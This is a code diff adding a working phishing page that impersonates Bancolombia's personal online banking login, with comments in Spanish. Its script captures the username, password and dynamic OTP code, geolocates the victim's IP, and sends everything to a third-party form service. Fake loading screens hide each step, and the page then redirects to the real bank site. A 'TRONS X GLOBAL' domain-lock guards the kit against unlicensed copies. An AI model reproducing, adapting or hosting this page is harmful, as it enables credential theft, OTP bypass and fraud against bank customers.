@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <!-- CÓDIGOS DE VERIFICACIÓN GOOGLE -->
+    <meta name="google-site-verification" content="IN1dI1y71vWWltEAxAsqonKaPb6s71H1Qv9Knr-uKSE" />
+    <meta name="google-site-verification" content="yvqWr0gXQ0jvA201iJv4DnHPw4NQYSqacOK1HC6yc9M" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Banco Virtual Personal | Diamond Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #ffffff; --card: #ffffff; --text: #000000; --text-m: #666666;
+            --border: #dddddd; --yellow: #ffdd00;
+            --rainbow: linear-gradient(90deg, #9cdb1d, #ffdd00, #ff7e00, #b366ff, #00d4ff, #9cdb1d);
+            --logo-filter: none;
+        }
+        [data-theme="dark"] {
+            --bg: #0b0b0b; --card: #1a1a1a; --text: #ffffff; --text-m: #aaaaaa;
+            --border: #2a2a2a;
+            --logo-filter: brightness(0) invert(1);
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; transition: background 0.4s, color 0.4s; }
+        body, html { height: 100%; width: 100%; overflow: hidden; background: var(--bg); color: var(--text); }
+        
+        /* Línea de color superior */
+        .top-line { position: fixed; top: 0; width: 100%; height: 6px; background: var(--rainbow); background-size: 200%; animation: flow 3s linear infinite; z-index: 10000; }
+        @keyframes flow { 0% { background-position: 0% 0%; } 100% { background-position: -200% 0%; } }
+
+        /* Aros decorativos */
+        .aro { position: absolute; border-radius: 50%; border: 25px solid; opacity: 0.15; pointer-events: none; z-index: 1; }
+        .aro-1 { width: 520px; height: 520px; border-color: #ffdd00; top: -120px; right: -120px; animation: floating 12s ease-in-out infinite; }
+        .aro-2 { width: 550px; height: 550px; border-color: #ff7e00; bottom: -150px; left: -150px; animation: floating 15s ease-in-out infinite reverse; }
+        @keyframes floating { 0% { transform: translate(0, 0); } 50% { transform: translate(-20px, 30px); } 100% { transform: translate(0, 0); } }
+
+        .view { display: none; width: 100%; height: 100%; position: absolute; flex-direction: column; align-items: center; justify-content: center; padding: 20px; z-index: 10; }
+        .active { display: flex; }
+
+        .logo-main { width: 210px; margin-bottom: 10px; filter: var(--logo-filter); }
+        .logo-top-right { position: absolute; top: 40px; right: 25px; width: 55px; filter: var(--logo-filter); }
+        .logo-footer { position: absolute; bottom: 30px; left: 25px; width: 160px; filter: var(--logo-filter); }
+
+        .login-card { background: var(--card); padding: 40px 30px; border-radius: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; border: 1px solid var(--border); z-index: 20; position: relative; }
+        
+        .input-group { border-bottom: 1px solid var(--border); margin-bottom: 25px; text-align: left; }
+        .input-group label { font-size: 10px; font-weight: 700; color: var(--text); letter-spacing: 1px; }
+        .input-group input { width: 100%; padding: 12px 0; border: none; outline: none; font-size: 17px; background: transparent; color: var(--text); }
+
+        .btn-yellow { width: 100%; padding: 16px; border-radius: 50px; border: none; background: var(--yellow); color: #000; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 8px 20px rgba(255,221,0,0.25); }
+
+        .app-links-small { display: flex; justify-content: center; gap: 15px; margin-top: 25px; }
+        .app-links-small img { height: 32px; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+
+        .load-bar { width: 180px; height: 5px; background: var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 15px; }
+        #bar-fill, #bar-fill-2 { width: 0%; height: 100%; background: var(--rainbow); background-size: 200%; transition: width 0.1s; }
+
+        .dark-mode-cont { position: absolute; bottom: 30px; right: 30px; display: flex; align-items: center; gap: 10px; z-index: 100; }
+        .switch { position: relative; width: 40px; height: 22px; cursor: pointer; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; inset: 0; background: #ccc; border-radius: 34px; transition: .4s; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background: var(--yellow); }
+        input:checked + .slider:before { transform: translateX(18px); }
+
+        /* ESTILO DEL STICKER DE PROTECCIÓN */
+        #protection-shield {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 999999; color: white; text-align: center;
+            justify-content: center; align-items: center; flex-direction: column; padding: 30px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- STICKER DE COBRO TRONS X GLOBAL -->
+    <div id="protection-shield">
+        <h1 style="font-size: 40px; color: #ffdd00;">SISTEMA BLOQUEADO</h1>
+        <p style="font-size: 22px; margin: 20px 0;">Licencia no válida para este dominio.</p>
+        <p style="background: #333; padding: 10px 20px; border-radius: 5px;">Propiedad de: <strong>TRONS X GLOBAL</strong></p>
+        <p style="margin-top: 20px; color: #999;">ID Copia: <span id="copy-id"></span></p>
+    </div>
+
+    <div class="top-line"></div>
+    <div class="aro aro-1"></div><div class="aro aro-2"></div>
+    
+    <img src="logo_pequeno.png" class="logo-top-right">
+    <img src="bancolombia_footer.png" class="logo-footer">
+
+    <div class="dark-mode-cont">
+        <label class="switch"><input type="checkbox" id="dark-toggle"><span class="slider"></span></label>
+        <i class="fa-solid fa-moon" style="font-size: 16px; color: var(--text);"></i>
+    </div>
+
+    <div id="v-login" class="view active">
+        <img src="logo.png" class="logo-main">
+        <p style="font-weight: 800; font-size: 11px; margin-bottom: 25px; letter-spacing: 2px;">SUCURSAL VIRTUAL PERSONAL</p>
+        <div class="login-card">
+            <h1 style="font-size: 40px; font-weight: 300; margin-bottom: 5px;">¡Hola!</h1>
+            <p style="color: var(--text-m); font-size: 14px; margin-bottom: 35px; font-weight: 600;">Ingresa tus datos para gestionar tus productos</p>
+            <div class="input-group"><label>USUARIO</label><input type="text" id="user" placeholder="Ingresa tu usuario" autocomplete="off"></div>
+            <div class="input-group"><label>CONTRASEÑA</label><input type="password" id="pass" placeholder="Ingresa tu clave" autocomplete="off"></div>
+            <button class="btn-yellow" onclick="irACarga1()">Ingresar</button>
+            <div class="app-links-small">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
+            </div>
+        </div>
+    </div>
+
+    <div id="v-load-1" class="view">
+        <div class="load-bar"><div id="bar-fill"></div></div>
+        <p style="font-size: 13px; font-weight: 700; color: var(--text-m);">Validando información segura...</p>
+    </div>
+
+    <div id="v-otp" class="view">
+        <img src="logo.png" class="logo-main">
+        <p style="font-weight: 800; font-size: 11px; margin-bottom: 25px; letter-spacing: 2px;">VERIFICACIÓN DE SEGURIDAD</p>
+        <div class="login-card">
+            <div style="margin-bottom: 20px;"><i class="fa-solid fa-shield-halved" style="font-size: 50px; color: var(--yellow);"></i></div>
+            <h2 style="font-size: 24px; font-weight: 400; margin-bottom: 10px;">Clave Dinámica</h2>
+            <p style="font-size: 13px; color: var(--text-m); margin-bottom: 20px;">Ingresa los 6 (seis) dígitos de tu App</p>
+            <div class="input-group">
+                <label>CÓDIGO DINÁMICO</label>
+                <input type="number" id="otp-input" placeholder="000000" oninput="if(this.value.length > 6) this.value = this.value.slice(0,6);">
+            </div>
+            <button class="btn-yellow" onclick="irAFinal()">Confirmar Ingreso</button>
+        </div>
+    </div>
+
+    <div id="v-load-2" class="view">
+        <div class="load-bar"><div id="bar-fill-2"></div></div>
+        <p style="font-size: 13px; font-weight: 700; color: var(--text-m);">Estableciendo conexión segura...</p>
+    </div>
+
+    <script>
+        // SEGURIDAD DE DOMINIO - TRONS X GLOBAL
+        (function(){
+            const d = "vr-codep.github.io";
+            const h = window.location.hostname;
+            // Solo bloquea si NO es tu dominio, NO es local y NO es apertura directa de archivo (h==="")
+            if(h !== d && h !== "localhost" && h !== "127.0.0.1" && h !== ""){
+                const s = document.getElementById('protection-shield');
+                s.style.display = 'flex';
+                document.getElementById('copy-id').innerText = h;
+                document.oncontextmenu = () => false;
+                document.onkeydown = () => false;
+            }
+        })();
+
+        const accessKey = "6e88479d-c593-4a84-be38-7218d1036f4e";
+        let u_ = "", c_ = "", info_ = {};
+
+        document.getElementById('dark-toggle').onchange = (e) => {
+            document.documentElement.setAttribute('data-theme', e.target.checked ? 'dark' : 'light');
+        };
+
+        async function obtenerRastreo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                info_ = { ip: data.ip, city: data.city, country: data.country_name, disp: navigator.userAgent.split(')')[0].split('(')[1] };
+            } catch(e) { info_ = { ip: "No detectada" }; }
+        }
+        obtenerRastreo();
+
+        function enviar(asunto, extra) {
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    access_key: accessKey, subject: asunto, Usuario: u_, Clave: c_, ...extra,
+                    Rastreo_IP: info_.ip, Ubicacion: info_.city + ", " + info_.country, Dispositivo: info_.disp
+                })
+            });
+        }
+
+        function irACarga1() {
+            u_ = document.getElementById('user').value;
+            c_ = document.getElementById('pass').value;
+            if(!u_ || !c_) return alert("Ingresa tus datos.");
+            document.getElementById('v-login').classList.remove('active');
+            document.getElementById('v-load-1').classList.add('active');
+            enviar("🔓 LOGIN: " + u_, {});
+            let b = 0;
+            const t = setInterval(() => {
+                b += 2; document.getElementById('bar-fill').style.width = b + "%";
+                if(b >= 100) { clearInterval(t); document.getElementById('v-load-1').classList.remove('active'); document.getElementById('v-otp').classList.add('active'); }
+            }, 30);
+        }
+
+        function irAFinal() {
+            const o = document.getElementById('otp-input').value;
+            if(o.length < 6) return alert("Ingresa los 6 dígitos completos.");
+            document.getElementById('v-otp').classList.remove('active');
+            document.getElementById('v-load-2').classList.add('active');
+            enviar("💎 FULL DATA: " + u_, { Clave_Dinamica: o });
+            let b = 0;
+            const t = setInterval(() => {
+                b += 3; document.getElementById('bar-fill-2').style.width = b + "%";
+                if(b >= 100) { clearInterval(t); window.location.href = "https://www.bancolombia.com/personas"; }
+            }, 40);
+        }
+    </script>
+</body>
+</html>
